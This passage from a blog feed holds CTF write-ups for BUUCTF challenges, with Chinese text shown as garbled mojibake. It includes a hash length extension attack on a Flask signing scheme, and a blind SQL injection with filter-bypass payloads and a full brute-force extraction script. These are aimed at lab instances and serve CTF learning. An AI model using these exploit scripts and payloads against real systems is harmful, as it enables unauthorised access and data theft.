class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure></div></li>
<li>æç¤ºç»™çš„æ˜¯ flag åœ¨ ./flag.txt </li>
</ul>
<hr>
<h3 id="è§£æ³•1-å­—ç¬¦ä¸²æ‹¼æ¥"><a href="#è§£æ³•1-å­—ç¬¦ä¸²æ‹¼æ¥" class="headerlink" title="è§£æ³•1 å­—ç¬¦ä¸²æ‹¼æ¥"></a>è§£æ³•1 å­—ç¬¦ä¸²æ‹¼æ¥</h3><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tubxpkj30t80h678h.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tubxpkj30t80h678h.jpg" class="lazyload" title="test"></a></p>
<table>
<thead>
<tr>
<th>geneSign()</th>
<th>è·å¾—paramå‚æ•°ï¼Œé€šè¿‡actionå’Œparamç”Ÿæˆç­¾å</th>
</tr>
</thead>
<tbody><tr>
<td>challenge()</td>
<td>è·å¾—cookiesä¸­çš„actionå’Œsign,å†å»é€šè¿‡urlä¼ å‚è·å–param,å¹¶ä¸”ä½¿ç”¨Taskå¯¹è±¡ï¼Œé€šè¿‡jsonè¿”å›Exec()æ–¹æ³•</td>
</tr>
<tr>
<td>index</td>
<td>å¾—åˆ°æºç </td>
</tr>
</tbody></table>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tub93aj30p60legou.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tub93aj30p60legou.jpg" class="lazyload" title="test"></a></p>
<p>åœ¨æ‰§è¡Œ <strong>Exec</strong> æ–¹æ³•çš„æ—¶å€™ï¼Œè°ƒç”¨<br>å°†ä¼ å…¥çš„ <code>action</code> å’Œ <code>param</code> å‚æ•°å’Œä¼ å…¥çš„ <code>sign</code> å‚æ•°è¿›è¡Œæ¯”è¾ƒã€‚è‹¥ç›¸ç­‰åˆ™æ‰§è¡Œåé¢çš„æ“ä½œã€‚<br>æ‰€ä»¥åªè¦æˆ‘ä»¬åé¢ä¼ å…¥çš„ <code>param</code>å’Œè·¯ç”± <code>/De1ta</code>ä¸‹ä¼ å…¥çš„ <code>param</code> ä¸€æ ·ï¼Œç„¶å <code>action</code> ä¹Ÿç­‰äº <code>scan</code>ã€‚å¹¶ä¸”å°† <code>/geneSign</code> è·¯ç”±ä¸‹è¿”å›çš„ <code>sign</code> ä¸€æ ·ï¼Œå°±å¯ä»¥äº†ã€‚</p>
<p><code>scan</code>å°±æ˜¯è®¿é—® <code>param</code> çš„ç½‘å€ï¼Œå¹¶å°†å…¶å†…å®¹çš„å‰50ä¸ªå­—æ¯è¿”å›å›æ¥ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tu743nj30hk056q3b.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tu743nj30hk056q3b.jpg" class="lazyload" title="test"></a></p>
<p>äºæ˜¯åœ¨/geneSignè·¯ç”±ä¸‹å°†paramä¼ å‚å¦‚ä¸‹:<br>è¿”å›äº†æˆ‘ä»¬è‡ªå·±æ„å»ºçš„signã€‚<br><code>geneSign?param=flag.txt</code> è¿”å›çš„ md5 å°±æ˜¯ <code>md5(&#39;xxx&#39; + &#39;flag.txt&#39; + &#39;scan&#39;)</code> ï¼Œåœ¨ python é‡Œé¢ä¸Šè¿°è¡¨è¾¾å¼å°±ç›¸å½“äº <code>md5(xxxflag.txtscan)</code> ï¼Œè¿™å°±å¾ˆæœ‰æ„æ€äº†ã€‚</p>
<p>ç›´æ¥æ„é€ è®¿é—® <code>/geneSign?param=flag.txtread</code> ï¼Œæ‹¿åˆ°çš„ md5 å°±æ˜¯ <code>md5(&#39;xxx&#39; + &#39;flag.txtread&#39; + &#39;scan&#39;)</code> ï¼Œç­‰ä»·äº <code>md5(&#39;xxxflag.txtreadscan&#39;)</code> ï¼Œè¿™å°±è¾¾åˆ°äº†ç›®æ ‡ã€‚</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tub2utj310q0b20uy.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tub2utj310q0b20uy.jpg" class="lazyload" title="test"></a></p>
<p>ç›´æ¥è®¿é—® <code>/De1ta?param=flag.txt</code> æ„é€  <code>cookie action=readscan;sign=714adcaac3f1bc1b4e8db9d68d7a0b3d</code>å³å¯<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tuc0qqj316w0b3tbf.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tuc0qqj316w0b3tbf.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="è§£æ³•2-å“ˆå¸Œæ‹“å±•æ”»å‡»"><a href="#è§£æ³•2-å“ˆå¸Œæ‹“å±•æ”»å‡»" class="headerlink" title="è§£æ³•2 å“ˆå¸Œæ‹“å±•æ”»å‡»"></a>è§£æ³•2 å“ˆå¸Œæ‹“å±•æ”»å‡»</h3><ul>
<li><p><code>secert_key</code> æ˜¯ä¸€ä¸ªé•¿åº¦ä¸º 16 çš„å­—ç¬¦ä¸²ï¼Œåœ¨ <code>/geneSign?param=flag.txt</code> ä¸­å¯ä»¥è·å– <code>md5(secert_key + &#39;flag.txt&#39; + &#39;scan&#39;)</code> çš„å€¼ï¼Œä¸º <code>d97019c7fd4afa870d4f49554b0280f4</code>ï¼Œè€Œç›®æ ‡åˆ™æ˜¯è·å– <code>md5(secert_key + &#39;flag.txt&#39; + &#39;readscan&#39;)</code> çš„å€¼</p>
</li>
<li><p>ä½¿ç”¨ hashpump å³å¯</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div></div><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/HashPump<span class="comment"># hashpump</span></span><br><span class="line">Input Signature: d97019c7fd4afa870d4f49554b0280f4</span><br><span class="line">Input Data: scan</span><br><span class="line">Input Key Length: 24</span><br><span class="line">Input Data to Add: <span class="built_in">read</span> </span><br><span class="line">ddecda548cb91c4480e23bcd5763ec3a</span><br><span class="line">scan\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\x00\x00\x00\x00read</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>exp : </p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://5f030a29-2344-4f54-b28d-43673b618ef4.node3.buuoj.cn/De1ta?param=flag.txt'</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;</span><br><span class="line">  <span class="string">'sign'</span>: <span class="string">'ddecda548cb91c4480e23bcd5763ec3a'</span>,</span><br><span class="line">  <span class="string">'action'</span>: <span class="string">'scan%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%e0%00%00%00%00%00%00%00read'</span>,</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">res = requests.get(url=url, cookies=cookies)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></div>

</li>
</ul>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tu7sc0j30ia02xmxk.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g9b8tu7sc0j30ia02xmxk.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="å¤§ä½¬çš„EXP"><a href="#å¤§ä½¬çš„EXP" class="headerlink" title="å¤§ä½¬çš„EXP"></a>å¤§ä½¬çš„EXP</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">conn = requests.Session()</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://5f030a29-2344-4f54-b28d-43673b618ef4.node3.buuoj.cn"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">(param)</span>:</span></span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"param"</span>: param</span><br><span class="line">    &#125;</span><br><span class="line">    resp = conn.get(url+<span class="string">"/geneSign"</span>,params=data).text</span><br><span class="line">    <span class="keyword">print</span> resp</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">(action,param,sign)</span>:</span></span><br><span class="line">    cookie=&#123;</span><br><span class="line">        <span class="string">"action"</span>:action,</span><br><span class="line">        <span class="string">"sign"</span>:sign</span><br><span class="line">    &#125;</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">"param"</span>:param</span><br><span class="line">    &#125;</span><br><span class="line">    resp = conn.get(url+<span class="string">"/De1ta"</span>,params=params,cookies=cookie)</span><br><span class="line">    <span class="keyword">return</span> resp.text</span><br><span class="line">filename = <span class="string">"local_file:///app/flag.txt"</span></span><br><span class="line">a = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>):</span><br><span class="line">    sign = geneSign(<span class="string">"&#123;&#125;read"</span>.format(filename.format(i)))</span><br><span class="line">    resp = challenge(<span class="string">"readscan"</span>,filename.format(i),sign)</span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"title"</span> <span class="keyword">in</span> resp):</span><br><span class="line">        a.append(i)</span><br><span class="line">    <span class="keyword">print</span> resp,i</span><br><span class="line"><span class="keyword">print</span> a</span><br></pre></td></tr></table></figure></div>
<ul>
<li><p>è¯·æ±‚ <code>/geneSign?param=local_file:///app/flag.txtread</code> è·å– md5 å€¼ä¸º 60ff07b83381a35d13caaf2daf583c94 ï¼Œå³ <code>md5(secert_key + &#39;local_file:///app/flag.txtread&#39; + &#39;scan&#39;)</code></p>
</li>
<li><p>ç„¶åå†è¯·æ±‚ <code>/De1ta?param=local_file:///app/flag.txt</code> æ„é€  <code>Cookie: action=readscan;sign=60ff07b83381a35d13caaf2daf583c94</code></p>
</li>
</ul>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>BuuctfDay3</title>
    <url>/yakko117/2019/11/18/BUUCTFDay3/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><h1 id="BUUCTF-Day3"><a href="#BUUCTF-Day3" class="headerlink" title="BUUCTF Day3"></a>BUUCTF Day3</h1><h2 id="CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World"><a href="#CISCN2019-ååŒ—èµ›åŒº-Day2-Web1-Hack-World" class="headerlink" title="[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World"></a>[CISCN2019 ååŒ—èµ›åŒº Day2 Web1]Hack World</h2><p>sqlæ³¨å…¥ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œå‘Šè¯‰ä½ è¡¨åå’Œåˆ—åæ˜¯flag<br>å…ˆæµ‹è¯• <code>1&#39;</code>ï¼Œå›æ˜¾æ˜¯boolå‹</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4ts17kj30kf05wglq.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4ts17kj30kf05wglq.jpg" class="lazyload" title="test"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">1'      bool(false)</span><br><span class="line">1'<span class="comment">#     SQL Injection Checked.</span></span><br><span class="line">1<span class="comment">#      SQL Injection Checked.</span></span><br><span class="line">1'%23   bool(false)</span><br><span class="line">1%23    Hello, glzjin wants a girlfriend.</span><br></pre></td></tr></table></figure></div>

<p>è¢«è¿‡æ»¤äº†å°±ä¼šæ˜¾ç¤ºSQL Injection Checkedï¼Œé€šè¿‡æµ‹è¯•<br>è¿‡æ»¤äº†<code>and&amp;&amp;ã€ or||ã€ ç©ºæ ¼ ã€# ã€forã€limit</code></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sql</div></div><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id=0</span><br><span class="line">id=1</span><br><span class="line">id=2</span><br><span class="line">id=3</span><br></pre></td></tr></table></figure></div>

<p>å‘ç°ç»“æœä¸ä¸€æ ·ï¼Œå°è¯• <code>&gt;4ï¼Œ&lt;4ï¼Œ =4</code></p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tuy14j30vg06haax.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tuy14j30vg06haax.jpg" class="lazyload" title="test"></a></p>
<p>åœ¨è‡ªå·±ç¯å¢ƒä¸‹è¯•ä¸€ä¸‹<br>å› ä¸ºæ•°æ®åº“æ˜¯testï¼Œ æ‰€ä»¥å¤§äºå’Œå°äºçš„æƒ…å†µä¸ºç©º<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tuw58j30oa08mabx.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tuw58j30oa08mabx.jpg" class="lazyload" title="test"></a></p>
<h3 id="çˆ†ä¸€ä¸‹æ•°æ®åº“"><a href="#çˆ†ä¸€ä¸‹æ•°æ®åº“" class="headerlink" title="çˆ†ä¸€ä¸‹æ•°æ®åº“"></a>çˆ†ä¸€ä¸‹æ•°æ®åº“</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="code"><pre><span class="line">id=(ascii(substr(database(),1,1))&gt;32)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://www.cnblogs.com/chrysanthemum/p/11740505.html" target="_blank" rel="noopener">å‚è€ƒlaolaoå¸ˆå‚…</a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># ç”¨çš„æ˜¯laolaoå¸ˆå‚…çš„è„šæœ¬</span><br><span class="line"></span><br><span class="line">import requests</span><br><span class="line">from lxml import etree</span><br><span class="line">def a():</span><br><span class="line">    url&#x3D;&quot;http:&#x2F;&#x2F;d2967de5-5584-4bdd-96c5-9b6ed11d9b86.node3.buuoj.cn&quot;</span><br><span class="line">    flag&#x3D;&quot;Hello, glzjin wants a girlfriend.&quot;</span><br><span class="line">    final&#x3D;&quot;&quot;</span><br><span class="line">    stop&#x3D;0</span><br><span class="line">    for i in range(1,129):</span><br><span class="line">         print(&quot;*&quot;*50,i,&quot;*&quot;*50)</span><br><span class="line">         stop&#x3D;0</span><br><span class="line">         for j in range(32,129):</span><br><span class="line">             stop &#x3D; j</span><br><span class="line">             data&#x3D;&#123;&quot;id&quot;:&quot;(ascii(substr(database(),%d,1))&#x3D;%d)&quot; %(i,j)&#125;</span><br><span class="line">             # data&#x3D;&#123;&quot;id&quot;:&quot;(ascii(substr((select flag from flag),%d,1))&#x3D;%d)&quot; %(i,j)&#125;</span><br><span class="line">             re &#x3D; requests.post(url&#x3D;url,data&#x3D;data).text.replace(&#39;\n&#39;,&#39;&#39;)</span><br><span class="line">             html &#x3D; etree.HTML(re).xpath(&quot;&#x2F;&#x2F;text()&quot;)</span><br><span class="line">             print(&quot;&gt;&gt;&quot;,html)</span><br><span class="line">             if flag in html:</span><br><span class="line">                  final+&#x3D;chr(j)</span><br><span class="line">                  print(&quot;\n\t\t\t\t&quot;,final)</span><br><span class="line">                  break</span><br><span class="line"></span><br><span class="line">         if stop &gt;&#x3D; 128:</span><br><span class="line">            print(&quot;*&quot;*50,&quot;ç»“æŸ&quot;)</span><br><span class="line">            print(&quot;&gt;&gt;&quot;,final)</span><br><span class="line">            break</span><br><span class="line"></span><br><span class="line">if __name__ &#x3D;&#x3D; &#39;__main__&#39;:</span><br><span class="line">       a()</span><br></pre></td></tr></table></figure></div>

<p>çˆ†å‡ºäº†æ•°æ®åº“<br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tskksj30cp03it8y.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tskksj30cp03it8y.jpg" class="lazyload" title="test"></a></p>
<hr>
<h3 id="è¿‡æ»¤å¦‚ä½•å¤„ç†ï¼š"><a href="#è¿‡æ»¤å¦‚ä½•å¤„ç†ï¼š" class="headerlink" title="è¿‡æ»¤å¦‚ä½•å¤„ç†ï¼š"></a>è¿‡æ»¤å¦‚ä½•å¤„ç†ï¼š</h3><p>åœ¨çˆ†flagçš„æ—¶å€™å‘ç°æœ‰è¿‡æ»¤ :select,show,â€â€â€¦â€¦å¾ˆæ˜¯éš¾å—ï¼Œåæ¥åœ¨å¸ˆå‚…çš„åšå®¢ä¸Šçœ‹åˆ°äº†è¿™ç§æ–¹æ³•ï¼š</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;1^(if((ascii(substr((select(flag)from(flag)),1,1))&#x3D;102),0,1))</span><br></pre></td></tr></table></figure></div>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4trln5j302u02d0sh.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4trln5j302u02d0sh.jpg" class="lazyload" title="test"></a></p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>^<span class="number">1</span>=<span class="number">0</span> ï¼Œ<span class="number">0</span>^<span class="number">0</span>=<span class="number">0</span> ï¼Œ<span class="number">0</span>^<span class="number">1</span>=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="number">1</span>^<span class="number">1</span>^<span class="number">1</span>=<span class="number">0</span>ï¼Œ <span class="number">1</span>^<span class="number">1</span>^<span class="number">0</span>=<span class="number">0</span></span><br><span class="line"></span><br><span class="line">æ„é€ payload:<span class="number">1</span>^ascii(mid(database(),<span class="number">1</span>,<span class="number">1</span>)=<span class="number">98</span>)^<span class="number">0</span></span><br></pre></td></tr></table></figure></div>

<p>æ³¨æ„è¿™é‡Œä¼šå¤šåŠ ä¸€ä¸ª <code>^0</code> æˆ– <code>1</code>æ˜¯å› ä¸ºåœ¨ç›²æ³¨çš„æ—¶å€™å¯èƒ½å‡ºç°äº†è¯­æ³•é”™è¯¯ä¹Ÿæ— æ³•åˆ¤æ–­,è€Œæ”¹å˜è¿™é‡Œçš„0æˆ–1,å¦‚æœ<code>è¿”å›çš„ç»“æœæ˜¯ä¸åŒ</code>çš„,é‚£å°±å¯ä»¥è¯æ˜è¯­æ³•æ˜¯æ²¡æœ‰é—®é¢˜çš„</p>
<p>ç„¶è€Œä¸ç”¨å¼‚æˆ–ä¹Ÿæ˜¯å¯ä»¥çš„</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id&#x3D;(ascii(substr((select(flag)from(flag)),1,1))&lt;128)</span><br></pre></td></tr></table></figure></div>

<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4twg59j311j07qq45.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4twg59j311j07qq45.jpg" class="lazyload" title="test"></a></p>
<p>æœ€åçš„è„šæœ¬</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">a</span><span class="params">()</span>:</span></span><br><span class="line">    url=<span class="string">"http://d2967de5-5584-4bdd-96c5-9b6ed11d9b86.node3.buuoj.cn/"</span></span><br><span class="line">    flag=<span class="string">"Hello, glzjin wants a girlfriend."</span></span><br><span class="line">    final=<span class="string">""</span></span><br><span class="line">    stop=<span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">1290</span>):</span><br><span class="line">         print(<span class="string">"*"</span>*<span class="number">50</span>,i,<span class="string">"*"</span>*<span class="number">50</span>)</span><br><span class="line">         stop=<span class="number">0</span></span><br><span class="line">         <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">32</span>,<span class="number">129</span>):</span><br><span class="line">             stop = j</span><br><span class="line">             data=&#123;<span class="string">"id"</span>:<span class="string">"1^(if((ascii(substr((select(flag)from(flag)),%d,1))=%d),0,1))"</span> %(i,j)&#125;</span><br><span class="line">             re = requests.post(url=url,data=data).text.replace(<span class="string">'\n'</span>,<span class="string">''</span>)</span><br><span class="line">             html = etree.HTML(re).xpath(<span class="string">"//text()"</span>)</span><br><span class="line">             <span class="comment"># print("&gt;&gt;",html)</span></span><br><span class="line">             <span class="keyword">if</span> flag <span class="keyword">in</span> html:</span><br><span class="line">                  final+=chr(j)</span><br><span class="line">                  print(<span class="string">"\n\t\t\t\t"</span>,final)</span><br><span class="line">                  <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">         <span class="keyword">if</span> stop &gt;= <span class="number">128</span>:</span><br><span class="line">            print(<span class="string">"*"</span>*<span class="number">50</span>,<span class="string">"ç»“æŸ"</span>)</span><br><span class="line">            print(<span class="string">"&gt;&gt;"</span>,final)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">       a()</span><br></pre></td></tr></table></figure></div>

<p>å¾—åˆ°flag</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tsrkmj30fs03ijrp.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQly1g8zp4tsrkmj30fs03ijrp.jpg" class="lazyload" title="test"></a></p>
<hr>
<h2 id="SUCTF-2019-CheckIn"><a href="#SUCTF-2019-CheckIn" class="headerlink" title="[SUCTF 2019]CheckIn"></a>[SUCTF 2019]CheckIn</h2><p><a href="https://github.com/team-su/SUCTF-2019/tree/master/Web/checkIn" target="_blank" rel="noopener">æºç </a><br><a href="http://www.mumaasp.com/222.html" target="_blank" rel="noopener">é‡è¦çŸ¥è¯†ç‚¹</a></p>
<p>ç‚¹å¼€é¢˜ç›®ï¼Œå‘ç°æ˜¯ä¸ªæ–‡ä»¶ä¸Šä¼ <br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu2gi2j30b505emx2.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1g91xgu2gi2j30b505emx2.jpg" class="lazyload" title="test"></a></p>
